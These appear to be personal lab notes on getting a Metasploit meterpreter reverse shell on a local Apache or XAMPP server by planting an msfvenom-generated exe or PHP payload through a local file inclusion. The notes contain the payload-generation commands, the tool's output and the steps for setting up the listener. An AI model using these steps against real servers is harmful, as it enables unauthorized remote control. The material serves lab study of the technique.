## Windows example
- Just set up a normal Apache server on a Windows machine

### Exploit
1. Run the command to create the exe file containing the input ```msfvenom -p linux/meterpreter/reverse_tcp LHOST=localhost LPORT=80 -f exe -o venomexample.exe``
>[!example] Now we expect in this case to have any local file inclusion on our Windows Apache server, in a real world scenario, obviously this vulnerability needs to be given first
>

2. start a multi/handler in Metasploit to listen on the specified port and receive the incoming reverse shell connection
3. Using the file inclusion we add the venomexample.exe site to our Apache server
4. Now we just call the url of the shell script we hid on the site https://localhost/venom.exe
 -> this file contains the payload to establish the reverse shell and connects directly to the specified port, we are listening to
#### XAMPP example
- Set up default XAMMP server, by installing XAMMP and add index.php


Start XAMPP service, including apache and mysql database using XAMMP GUI
```
jmxnzo@jmxnzo-ThinkPad-T470-W10DG:~$ sudo /opt/lampp/manager-linux-x64.run
```

### Exploit
1. Use msfvenom to create the exploit php file, which contains the payload for spawing our shell, specifying the port(LPORT), on which we are running the reverse shell listener
```
jmxnzo@jmxnzo-ThinkPad-T470-W10DG:~$ sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=3002 -f raw -o shell.php
[sudo] password for jmxnzo: 
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1110 bytes
Saved as: shell.php
```
2. start a multi/handler in Metasploit to listen on the specified port and receive the incoming reverse shell connection
>[!example] Now we expect in this case to have any local file inclusion on our XAMMP server, in a real world scenario, obviously this vulnerability needs to be given first
>
> 
3. Using the file inclusion we add the shell.php site to our XAMMP website
4. Now we just call the url of the shell script we hid on the site https://localhost/Mysyte/shell.php
 -> this file contains the payload to establish the reverse shell and connects directly to the specified port, we are listening to
![[Pasted image 20231026230351.png]]
-> as seen in the image above there was started a reverse shell from port 3002 to port 35168 on our localhost

